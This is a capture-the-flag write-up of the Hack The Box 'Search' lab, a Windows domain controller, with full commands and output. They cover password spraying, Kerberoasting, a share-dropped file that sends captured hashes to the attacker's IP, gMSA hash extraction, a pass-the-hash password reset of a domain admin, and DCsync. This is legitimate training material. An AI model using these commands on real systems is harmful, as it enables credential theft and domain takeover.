---
layout: post
title: "search"
date: 2025-10-03 
categories: OSCP Playlist
---
# search

# Summary

- kerbrute to find valid AD users
- Find credential on web image
- Valid credential to enumerate LDAP user descriptions, to find helpdesk account + password reuse
- find kerberoastable user
- enumerate all files with spider_plus module from nxc
- find field protected excel, bypass field to reveal additional credential for user sierra.frye
- map out AD and users’ privileges and rights with bloodhound, to find gmsa read permission
- obtain NTLM from gmsa account → Generic Write over user tristan, who is Enterprise Admin → force password change
- We now have remote execution privilege, and can dcsync

# Attack Path

Let’s enumerate the open ports and services:

```jsx
sudo nmap -sC -sV -oN nmap/search 10.10.11.129

53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Search &mdash; Just Testing IIS
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-02 22:31:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-02T22:33:08+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn:
|_  http/1.1
| http-methods:
|_  Potentially risky methods: TRACE
|_ssl-date: 2025-10-02T22:33:08+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-02T22:33:08+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-02T22:33:08+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2025-10-02T22:33:08+00:00; 0s from scanner time.
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

```

From the open ports and services e.g. port 88, 53, 445, this looks like Windows domain controller. We also get the domain name, let’s add that to our /etc/hosts file:

```jsx
10.10.11.129 search.htb
```

## SMB

From the cert, we also see that the common name is research, this usually corresponds to the machine hostname. Let’s attempt a null authentication to the smb server:

```jsx
nxc smb 10.10.11.129 -u 'any' -p '' --shares
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\any: STATUS_LOGON_FAILURE

smbclient -N -L //10.10.11.129
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.129 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We were right, the hostname is RESEARCH, but null authentication listing shares failed.

## DNS

Since we know the domain name and there is a web server, let’s perform a zone transfer and see if there are any subdomains:

```jsx
dig axfr search.htb @10.10.11.129

; <<>> DiG 9.20.11-4+b1-Debian <<>> axfr search.htb @10.10.11.129
;; global options: +cmd
; Transfer failed.
                   
```

Nope.

## LDAP

Since LDAP is available, we can use ldapsearch to get more information about the domain:

```jsx
ldapsearch -x -H ldaps://10.10.11.129 -s base -b "" namingContexts

# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectclass=*)
# requesting: namingContexts 
#

#
dn:
namingContexts: DC=search,DC=htb
namingContexts: CN=Configuration,DC=search,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=search,DC=htb
namingContexts: DC=DomainDnsZones,DC=search,DC=htb
namingContexts: DC=ForestDnsZones,DC=search,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Let’s try enumerating all users:

```jsx
ldapsearch -x -H ldap://10.10.11.129 -b "DC=search,DC=htb" "(objectClass=user)" sAMAccountName,userPrincipalName,mail,description

ldapsearch -h ldap://10.10.11.129 -p 389 -x -b "DC=search,DC=htb" "(objectclass=*)"
```

We do not have permission to enumerate any objects through anonymous bind.

```jsx
ldapsearch -x -H ldap://10.10.11.129 -b "DC=DomainDnsZones,DC=search,DC=htb" "(objectClass=dnsZone)" name
```

Does not work.

We also see that global catalogue (port 3268) is available. The Global Catalog is a distributed data store that contains a partial, read-only replica of all domain objects in the forest, optimized for cross-domain queries (e.g., finding users or groups forest-wide). Let’s try querying it:

```jsx
ldapsearch -x -H ldap://10.10.11.129:3268 -b "DC=search,DC=htb" "(objectClass=*)"

# extended LDIF
#
# LDAPv3
# base <DC=search,DC=htb> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1

ldapsearch -x -H ldap://10.10.11.129:3268 -D "guest@search.htb" -w "" -b "DC=search,DC=htb" "(objectClass=*)"
# extended LDIF
#
# LDAPv3
# base <DC=search,DC=htb> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1

```

Did not work. LDAPS don’t work either.

Let’s try to enumerate all users with RID brute:

```jsx
nxc smb 10.10.11.129 -u 'any' -p '' --rid-brute 6000
```

## Web

### HTTP:

![image.png]({{ site.baseurl }}/assets/search/image.png)

We also see a contact functionality:

![image.png]({{ site.baseurl }}/assets/search/image%201.png)

It sends a GET request with our message:

```jsx
GET /index.html?message=I+have+a+message HTTP/1.1
Host: 10.10.11.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://10.10.11.129/index.html
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

We see the template used is colorlib.

![image.png]({{ site.baseurl }}/assets/search/image%202.png)

Not much else.

HTTPS looks the same as HTTP. Let’s fuzz the HTTP site:

```jsx
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.11.129/FUZZ -ic

images                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 51ms]
                        [Status: 200, Size: 44982, Words: 13260, Lines: 1030, Duration: 24ms]
Images                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 19ms]
css                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 21ms]
js                      [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 17ms]
fonts                   [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 19ms]
IMAGES                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 17ms]
staff                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 2317ms]
Staff                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 1138ms]
Fonts                   [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 17ms]
CSS                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 17ms]
JS                      [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 18ms]
```

## Enumerating users

We do see some users

![image.png]({{ site.baseurl }}/assets/search/image%203.png)

```bash
~/tools/kerbrute/kerbrute_linux_amd64 userenum -d search.htb --dc 10.10.11.129 users.txt -o valid_users.txt
```

Let’s make a users list. Let’s use hashcat to generate possible usernames:

```bash
keely.lyons
dax.santiago
sierra.frye
kyla.stewart
kiara.spencer
dave.simpson
ben.thompson
chris.stewart
```

```bash
hashcat --stdout basenames.txt -r username.rules > f_users.txt
```

```bash
~/tools/kerbrute/kerbrute_linux_amd64 userenum -d search.htb --dc 10.10.11.129 f_users.txt -o valid_users.txt

2025/10/03 05:46:59 >  [+] VALID USERNAME:       sierra.frye@search.htb
2025/10/03 05:46:59 >  [+] VALID USERNAME:       dax.santiago@search.htb
2025/10/03 05:46:59 >  [+] VALID USERNAME:       keely.lyons@search.htb
```

Let’s see if any of the users are ASREProastable:

```bash
nxc ldap 10.10.11.129 -u valid_users.txt -p '' --asreproast asreproast.out

LDAP        10.10.11.129    389    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 (name:RESEARCH) (domain:search.htb)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

After carefully reviewing the the site, we find another clue:

![image.png]({{ site.baseurl }}/assets/search/image%204.png)

![image.png]({{ site.baseurl }}/assets/search/image%205.png)

The interesting part is:

```bash
Send password to Hope Sharp
IsolationIsKey?
```

Let’s first see if this user is valid; add it to our users.txt

```bash
~/tools/kerbrute/kerbrute_linux_amd64 userenum -d search.htb --dc 10.10.11.129 users.txt 

2025/10/03 05:52:30 >  [+] VALID USERNAME:       dax.santiago@search.htb
2025/10/03 05:52:30 >  [+] VALID USERNAME:       sierra.frye@search.htb
2025/10/03 05:52:30 >  [+] VALID USERNAME:       keely.lyons@search.htb
2025/10/03 05:52:30 >  [+] VALID USERNAME:       hope.sharp@search.htb

```

Now, let’s use the password spray option

```bash
~/tools/kerbrute/kerbrute_linux_amd64 passwordspray -d search.htb --dc 10.10.11.129 users.txt "IsolationIsKey?"

2025/10/03 05:56:28 >  [+] VALID LOGIN:  hope.sharp@search.htb:IsolationIsKey?
2025/10/03 05:56:28 >  Done! Tested 9 logins (1 successes) in 0.186 seconds

```

We now have a valid account. Let’s start enumerating LDAP:

```bash
enum4linux -u hope.sharp -p "IsolationIsKey?" 10.10.11.129
```

Let’s search entire subtree, sometimes passwords are left here:

```bash
ldapsearch -x -H ldap://10.10.11.129 -D "hope.sharp@search.htb" -w "IsolationIsKey?" -b "dc=search,dc=htb" -s sub "(objectClass=*)" | grep -i password
```

Nope.

let’s get a complete users list:

```bash
nxc smb 10.10.11.129 -u hope.sharp -p "IsolationIsKey?" --rid-brute 6000
```

Now let’s save it to a file:

```bash
grep SEARCH rid-brute.txt | awk '{print $6}' | awk -F\\ '{print $2}' | sort -u | grep -v '\$$' | tr '[:upper:]' '[:lower:]' > ad_users.txt
```

Now let’s look for asproastable user:

```bash
nxc ldap 10.10.11.129 -u ad_users.txt -p '' --asreproast asreproast.out

```

## Kerberoast

Let’s find kerberoastable users:

```bash
nxc ldap 10.10.11.129 -u hope.sharp -p "IsolationIsKey?" --kerberoasting kerberoasting.out

LDAP        10.10.11.129    389    RESEARCH         $krb5tgs$23$*web_svc$SEARCH.HTB$search.htb\web_svc*$2fd99336dbe9e6dc67b37fef49cd4e0f$fb81d8b940607a2fc68065c803442861a4ace11fe5ed4c95d3e0f6c2de76930cee6d06aceb1607cd5004698e86e2b9af12b7d9f07482bbdb4619750b99509c2fa6c1217f0f62d66e0623360a4babbe298ebfe28502033724995eb13b6942c2ba0cc99f5750eb6ede1d2dc1c890ec6d21192b6a0c0bd6683a7c8b30dd4f529f464d0b634b00782cb85653be52285308b101ccdb252b8d49ff0b8ce90131d45708218cb4a25a0704f12556a350281c0009f5ff1db311320648fb0803a356769b2df26a1b7c49956552fc70a761c60c41e1b8a2f1eabfa24bec52453d3791c4b7c0ce23aadb20e9830abc4da05200dec7b806aab887723f5bed063c7c7738bace753b647ce6508c4697ed5c345ad1e0a66607f6b5009c8770ce6e09e321643c3876a269ebc2a08d5a2c377ea468094e035ff85939843e9e2929555dec66a62e56c2bd0fcbaa1c2226fe44c123df3bb86e1730242e33ef9ab73dbfb0526b6f8c22fe8df1aaed780e4aceea48dc675ee7a5a0211728dbd2c957213441acdd6811f5ac5209ae1eaa0672af3cc77b44eb9762c8fa0bdea785d5e68e08b958fc6300fcca49b66e496a032f0d90e90b69c088df7217a6924c618740eae2a0b0e509cba9c54516d53b0cfd8cde45f74f69e9d76518d5839749034d94da4609535942c98d628fe24b11256b28abd44127134ecd34f62a6d8800522704eaf6d9b2e2c292c73f92f59397f2f5bbb703ef14178c5562ae55c96ca1f18e801314370f088c9ffab4642a091f0c164d22948c5009cd25bcc82051c4ce8fa9d84f3d6b9a9a2623be2d0612cdaa324ee7c22ccb2a5646b2ca4ab75a30e0095eaa18ce2b1701df1ef4149571f44c69e05ec8d9ede238071f7d3e14d30402e123bbb6705cf7b01c9f6da4d96d23c690f9e5b9bac8960f70dfe3a04438ae14c0918a00f966aa9f859eaee6aed0051f7dc6955f3e68f7fdb724290b8b5bcfa5189faface1d21a7a5f13614587f7e56ab26693ae5ff4e591b4ebd00a57a370b6d622178b2c3f9358b02921056fb75384bfa5cc8c6852774a060e4aa082784e9177a4e0c46b83a82e8fc37edc9b1bec85bc5fdde4435c2fa4807960d8508b2e968b8a436bebeebe23921c49d086429a7e0881acccecae0849354e0e37544342dbf3f59010695f40c4aed60b4141ac13b07b6ff4b22082778046001a54a5b91f7071a2b5f0b5cb300c1e7651b559dc6f42d30bcf0c50740a02035c5b84f03a6b055ab7be698e904a4ed8c6cd98f820568688c6ff350f0eca82f386afddfa5c0e56731bb3cb53986734aad58601840002b5bc163c9183c51405fb55311cb32e5fb3a6dd3f95723122350c8964c39c38922fb53c617cded5ef261495aec2091970f6b2e42c53aeff75d52a98c0ea8e080c71dfd3a110b99f05b8895d3c0bd3990f2a87a956aa6a6a383ab0aa211eb92bc517c9f43aa89fd5b88513a0e0c8c20f1bbca0
```

We found one user, web_svc’s TGS hash. Let’s attempt to crack it:

```bash
.\hashcat.exe -m 13100 ..\hashes.txt ..\rockyou.txt

web_svc:@3ONEmillionbaby
```

Let’s enumerate shares as well.

```bash
nxc smb 10.10.11.129 -u hope.sharp -p "IsolationIsKey?" --shares

SMB         10.10.11.129    445    RESEARCH         Share           Permissions     Remark
SMB         10.10.11.129    445    RESEARCH         -----           -----------     ------
SMB         10.10.11.129    445    RESEARCH         ADMIN$                          Remote Admin
SMB         10.10.11.129    445    RESEARCH         C$                              Default share
SMB         10.10.11.129    445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.11.129    445    RESEARCH         helpdesk                        
SMB         10.10.11.129    445    RESEARCH         IPC$            READ            Remote IPC
SMB         10.10.11.129    445    RESEARCH         NETLOGON        READ            Logon server share 
SMB         10.10.11.129    445    RESEARCH         RedirectedFolders$ READ,WRITE      
SMB         10.10.11.129    445    RESEARCH         SYSVOL          READ            Logon server share 
```

Let’s look in CertEnroll:

```bash
nxc smb 10.10.11.129 -u hope.sharp -p "IsolationIsKey?" --spider CertEnroll --regex .

SMB         10.10.11.129    445    RESEARCH         //10.10.11.129/CertEnroll/. [dir]
SMB         10.10.11.129    445    RESEARCH         //10.10.11.129/CertEnroll/.. [dir]
SMB         10.10.11.129    445    RESEARCH         //10.10.11.129/CertEnroll/nsrev_search-RESEARCH-CA.asp [lastm:'2020-04-07 03:29' size:330]
SMB         10.10.11.129    445    RESEARCH         //10.10.11.129/CertEnroll/Research.search.htb_search-RESEARCH-CA.crt [lastm:'2020-04-07 03:29' size:883]
SMB         10.10.11.129    445    RESEARCH         //10.10.11.129/CertEnroll/search-RESEARCH-CA+.crl [lastm:'2025-10-02 17:39' size:735]
SMB         10.10.11.129    445    RESEARCH         //10.10.11.129/CertEnroll/search-RESEARCH-CA.crl [lastm:'2025-10-02 17:39' size:931]
```

Let’s look in RedirectedFolders$:

```bash
nxc smb 10.10.11.129 -u hope.sharp -p "IsolationIsKey?" --spider 'RedirectedFolders$' --regex .

SMB         10.10.11.129    445    RESEARCH         //10.10.11.129/RedirectedFolders$/sierra.frye/user.txt [lastm:'2021-11-17 20:01' size:33]

SMB         10.10.11.129    445    RESEARCH         //10.10.11.129/RedirectedFolders$/sierra.frye/Desktop/user.txt [lastm:'2021-11-17 20:18' si
ze:33]
```

Let’s check web_svc:

```bash
nxc smb 10.10.11.129 -u web_svc -p "@3ONEmillionbaby" --shares

SMB         10.10.11.129    445    RESEARCH         Share           Permissions     Remark
SMB         10.10.11.129    445    RESEARCH         -----           -----------     ------
SMB         10.10.11.129    445    RESEARCH         ADMIN$                          Remote Admin
SMB         10.10.11.129    445    RESEARCH         C$                              Default share
SMB         10.10.11.129    445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.11.129    445    RESEARCH         helpdesk                        
SMB         10.10.11.129    445    RESEARCH         IPC$            READ            Remote IPC
SMB         10.10.11.129    445    RESEARCH         NETLOGON        READ            Logon server share 
SMB         10.10.11.129    445    RESEARCH         RedirectedFolders$ READ,WRITE      
SMB         10.10.11.129    445    RESEARCH         SYSVOL          READ            Logon server share
```

Since we have write permission in RedirectedFolders$, lets’ try dropping a file to try and capture more hashes. First, start a responder:

```bash
sudo responder -I tun0
```

Now let’s drop our file:

```bash
nxc smb 10.10.11.129 -u web_svc -p "@3ONEmillionbaby" -M drop-sc -o URL=\\\\10.10.16.9\\secret SHARE="RedirectedFolders$/sierra.frye/Desktop" FILENAME=secret

DROP-SC     10.10.11.129    445    RESEARCH         [+] Found writable share: RedirectedFolders$
DROP-SC     10.10.11.129    445    RESEARCH         [+] [OPSEC] Created secret.searchConnector-ms file on the RedirectedFolders$ share

```

While we wait for a hash, let’s move on.

We see where we need to end up. 

## Bloodhound - Map AD

At this point, we have no further information to enumerate, let’s 

map out the AD with bloodhound.

```bash
mkdir bh_out
cd bh_out

bloodhound-python -u hope.sharp -p 'IsolationIsKey?' -ns 10.10.11.129 -d search.htb -c all
```

Now let’s start bloodhound and start investigating:

```bash
sudo neo4j start
bloodhound
```

No additional privleges for hope.sharp:

![image.png]({{ site.baseurl }}/assets/search/image%206.png)

Neither with web_svc:

![image.png]({{ site.baseurl }}/assets/search/image%207.png)

Nothing either.

## LDAP user descriptions

Let’s check out user descriptions in LDAP:

```bash
nxc ldap 10.10.11.129 -u web_svc -p "@3ONEmillionbaby" -M user-desc 

User:                     Description:
Administrator             Built-in account for administering the computer/domain
Guest                     Built-in account for guest access to the computer/domain
krbtgt                    Key Distribution Center Service Account
Lane.Wu                   HelpDesk User
Rene.Larson               ITSec User
Edgar.Jacobs              HelpDesk User
Chanel.Bell               HelpDesk User
Keely.Lyons               ITSec User
Abby.Gonzalez             ITSec User
Camren.Luna               ITSec User
Keith.Hester              HelpDesk User
Sierra.Frye               ITSec User
Isabela.Estrada           HelpDesk User
web_svc                   Temp Account created by HelpDesk
Tristan.Davies            The only Domain Admin allowed, Administrator will soon be disabled
BIR-ADFS-GMSA$            ADFS on Covid

```

We see that web_svc is created by HelpDesk. Maybe the users who created gave it the same password as themselves. We also note that Tristan.Davies is domain admin. Let’s try password spraying the helpdesk users:

```bash
nxc smb 10.10.11.129 -u Edgar.Jacobs Chanel.Bell Keith.Hester Isabela.Estrada Lane.Wu -p "@3ONEmillionbaby" --continue-on-success

SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby 

```

We got another valid user:

```bash
Edgar.Jacobs:@3ONEmillionbaby
```

Let’s check our smb shares access again:

```bash
nxc smb 10.10.11.129 -u Edgar.Jacobs -p "@3ONEmillionbaby" --shares

SMB         10.10.11.129    445    RESEARCH         Share           Permissions     Remark
SMB         10.10.11.129    445    RESEARCH         -----           -----------     ------
SMB         10.10.11.129    445    RESEARCH         ADMIN$                          Remote Admin
SMB         10.10.11.129    445    RESEARCH         C$                              Default share
SMB         10.10.11.129    445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.11.129    445    RESEARCH         helpdesk        READ            
SMB         10.10.11.129    445    RESEARCH         IPC$            READ            Remote IPC
SMB         10.10.11.129    445    RESEARCH         NETLOGON        READ            Logon server share 
SMB         10.10.11.129    445    RESEARCH         RedirectedFolders$ READ,WRITE      
SMB         10.10.11.129    445    RESEARCH         SYSVOL          READ            Logon server share 
```

We can read the helpdesk share. Let’s see what’s inside:

```bash
nxc smb 10.10.11.129 -u Edgar.Jacobs -p "@3ONEmillionbaby" --spider helpdesk --regex .

```

Nothing. Let’s check our privileges on bloodhound:

![image.png]({{ site.baseurl }}/assets/search/image%208.png)

We are member of the LONDON-HELPDESK group and HELPDESK group. However, they don’t really have any further privileges:

![image.png]({{ site.baseurl }}/assets/search/image%209.png)

Let’s check DNS:

```bash
nxc ldap 10.10.11.129 -u web_svc -p "@3ONEmillionbaby" -M get-network -o ALL=true
portal.search.htb        10.10.11.11
```

However, that IP is not up.

- The `Local Administrator Password Solution (LAPS)` provides management of local account passwords on domain-joined computers. Passwords are stored in Active Directory (AD) and protected by ACLs, so only certain users can read them or request a password reset
- With the `laps` module, we can retrieve all computers an account has access to read. We can also use the option `COMPUTER` to specify a computer or use it with a wildcard to get a few computers with a similar name.

```bash
nxc ldap 10.10.11.129 -u Edgar.Jacobs -p "@3ONEmillionbaby" -M laps

LAPS        10.10.11.129    389    RESEARCH         [-] No result found with attribute ms-MCS-AdmPwd or msLAPS-Password !

nxc smb 10.10.11.129 -u Edgar.Jacobs -p "@3ONEmillionbaby" --loggedon-users
```

Nothing. 

Enumerating All Files with spider_plus module:

Let’s just try and see what other files are available:

```bash
nxc smb 10.10.11.129 -u Edgar.Jacobs -p "@3ONEmillionbaby" -M spider_plus -o EXCLUDE_DIR=IPC$,NETLOGON,SYSVOL

SPIDER_PLUS 10.10.11.129    445    RESEARCH         [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.10.11.129.json".
SPIDER_PLUS 10.10.11.129    445    RESEARCH         [*] SMB Shares:           8 (ADMIN$, C$, CertEnroll, helpdesk, IPC$, NETLOGON, RedirectedFolders$, SYSVOL)
SPIDER_PLUS 10.10.11.129    445    RESEARCH         [*] SMB Readable Shares:  6 (CertEnroll, helpdesk, IPC$, NETLOGON, RedirectedFolders$, SYSVOL)
SPIDER_PLUS 10.10.11.129    445    RESEARCH         [*] SMB Writable Shares:  1 (RedirectedFolders$)
SPIDER_PLUS 10.10.11.129    445    RESEARCH         [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.11.129    445    RESEARCH         [*] Total folders found:  148
SPIDER_PLUS 10.10.11.129    445    RESEARCH         [*] Total files found:    37
SPIDER_PLUS 10.10.11.129    445    RESEARCH         [*] File size average:    1.43 KB
SPIDER_PLUS 10.10.11.129    445    RESEARCH         [*] File size min:        20 B
SPIDER_PLUS 10.10.11.129    445    RESEARCH         [*] File size max:        22.59 KB

```

We can  use jq to filter for keys, making the found files/dir easier to view:

```bash
cat /home/kali/.nxc/modules/nxc_spider_plus/10.10.11.129.json | jq .

#interesting finds:

"RedirectedFolders$": { 
    "edgar.jacobs/Desktop/Phishing_Attempt.xlsx": {
      "atime_epoch": "2020-08-10 06:30:05",
      "ctime_epoch": "2020-04-09 16:06:41",
      "mtime_epoch": "2020-08-10 06:30:05",
      "size": "22.59 KB"

```

Let’s retrieve this file:

```bash
nxc smb 10.10.11.129 -u Edgar.Jacobs -p "@3ONEmillionbaby" --share RedirectedFolders$ --get-file edgar.jacobs/Desktop/Phishing_Attempt.xlsx Phishing_Attempt.xlsx
```

Now let’s open the file in libre office. Once opened, we realise that a column is password protected.

![image.png]({{ site.baseurl }}/assets/search/image%2010.png)

We see that column C is missing. Double-clicking it, trying to expand it we get this error:

![image.png]({{ site.baseurl }}/assets/search/image%2011.png)

## Excel Protected Cell Exploit

Searching the web for remove excel spreadsheet password exploit, we find https://youtu.be/24rISp-naqI?si=82MqynZoAR7pKgOP

and https://www.excelsupersite.com/how-to-remove-an-excel-spreadsheet-password-in-6-easy-steps/

Let’s follow the steps. First, let’s back up the file. Then, rename our file to a .zip file:

```bash
cp Phishing_Attempt.xlsx phishing.xlsx

mv phishing.xlsx phishing.zip
```

Now we have to unzip it. Let’s make a new dir to keep it tidy:

```bash
mkdir phishing
mv phishing.zip phishing/
cd phishing

unzip phishing.zip

```

![image.png]({{ site.baseurl }}/assets/search/image%2012.png)

We get a list of files. Recall the excel spread sheet, we want the password protected column on sheet 2, we can tell from the bottom left:

![image.png]({{ site.baseurl }}/assets/search/image%2013.png)

Now let’s edit sheet2.xml. Now search for the entire `<sheetProtection ..SNIP />` entity, and delete it:

![image.png]({{ site.baseurl }}/assets/search/image%2014.png)

Now save it modified file, and zip the whole archive together again, and rename it to .xlsx. Now when we open the excel spreadsheet back up on libreoffice, we can click and drag column C out:

![image.png]({{ site.baseurl }}/assets/search/image%2015.png)

We immediately see Sierra Frye, we remember she has a user.txt file on her Desktop. Let’s see if her password is valid:

```bash
nxc smb 10.10.11.129 -u sierra.frye -p '$$49=wide=STRAIGHT=jordan=28$$18' --shares

SMB         10.10.11.129    445    RESEARCH         [+] search.htb\sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18 
SMB         10.10.11.129    445    RESEARCH         [*] Enumerated shares
SMB         10.10.11.129    445    RESEARCH         Share           Permissions     Remark
SMB         10.10.11.129    445    RESEARCH         -----           -----------     ------
SMB         10.10.11.129    445    RESEARCH         ADMIN$                          Remote Admin
SMB         10.10.11.129    445    RESEARCH         C$                              Default share
SMB         10.10.11.129    445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.11.129    445    RESEARCH         helpdesk                        
SMB         10.10.11.129    445    RESEARCH         IPC$            READ            Remote IPC
SMB         10.10.11.129    445    RESEARCH         NETLOGON        READ            Logon server share 
SMB         10.10.11.129    445    RESEARCH         RedirectedFolders$ READ,WRITE      
SMB         10.10.11.129    445    RESEARCH         SYSVOL          READ            Logon server share
```

## Privilege Escalation to Enterprise Admin

It’s valid. Let’s check bloodhound and see what privileges this user has.

![image.png]({{ site.baseurl }}/assets/search/image%2016.png)

We have ReadGMSA Password rights. This privilege allow us to derive the NTLM password from GMSA password. Let’s use nxc for this:

```bash
nxc ldap 10.10.11.129 -u sierra.frye -p '$$49=wide=STRAIGHT=jordan=28$$18' --gmsa

LDAPS       10.10.11.129    636    RESEARCH         Account: BIR-ADFS-GMSA$       NTLM: e1e9fd9e46d0d747e1595167eedcec0f     PrincipalsAllowedToReadPassword: ITSec

#now verify 

nxc smb 10.10.11.129 -u BIR-ADFS-GMSA$ -H e1e9fd9e46d0d747e1595167eedcec0f --shares

SMB         10.10.11.129    445    RESEARCH         [+] search.htb\BIR-ADFS-GMSA$:e1e9fd9e46d0d747e1595167eedcec0f
```

Let’s see what rights this account has:

![image.png]({{ site.baseurl }}/assets/search/image%2017.png)

We have GenericAll over Tristan.Davies. If we recall from the user descriptions, tristian is a domain admin account. We have Force Password Change rights. Let’s use pass-the-hash technique to perform this change:

```bash
pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"

pth-net rpc password "tristan.davies" "newP@ssword2022" -U "search.htb"/"BIR-ADFS-GMSA$"%"ffffffffffffffffffffffffffffffff":"e1e9fd9e46d0d747e1595167eedcec0f" -S "10.10.11.129"
```

Let’s verify if the changes were made:

```bash
nxc smb 10.10.11.129 -u tristan.davies -p 'newP@ssword2022' --shares

SMB         10.10.11.129    445    RESEARCH         [+] search.htb\tristan.davies:newP@ssword2022 (Pwn3d!)
SMB         10.10.11.129    445    RESEARCH         [*] Enumerated shares
SMB         10.10.11.129    445    RESEARCH         Share           Permissions     Remark
SMB         10.10.11.129    445    RESEARCH         -----           -----------     ------
SMB         10.10.11.129    445    RESEARCH         ADMIN$          READ,WRITE      Remote Admin
SMB         10.10.11.129    445    RESEARCH         C$              READ,WRITE      Default share
SMB         10.10.11.129    445    RESEARCH         CertEnroll      READ,WRITE      Active Directory Certificate Services share
SMB         10.10.11.129    445    RESEARCH         helpdesk                        
SMB         10.10.11.129    445    RESEARCH         IPC$            READ            Remote IPC
SMB         10.10.11.129    445    RESEARCH         NETLOGON        READ,WRITE      Logon server share 
SMB         10.10.11.129    445    RESEARCH         RedirectedFolders$ READ,WRITE      
SMB         10.10.11.129    445    RESEARCH         SYSVOL          READ,WRITE      Logon server share
```

We see now we have remote execution rights, and rights to see the admin drive. We are Enterprise Admin:

![image.png]({{ site.baseurl }}/assets/search/image%2018.png)

Now we can just perform DCsync and get all password hashes if wanted to.

```bash
nxc smb 10.10.11.129 -u tristan.davies -p 'newP@ssword2022' -M ntdsutil

OR

impacket-secretsdump -just-dc-user administrator search.htb/tristan.davies:'newP@ssword2022'@10.10.11.129 
```

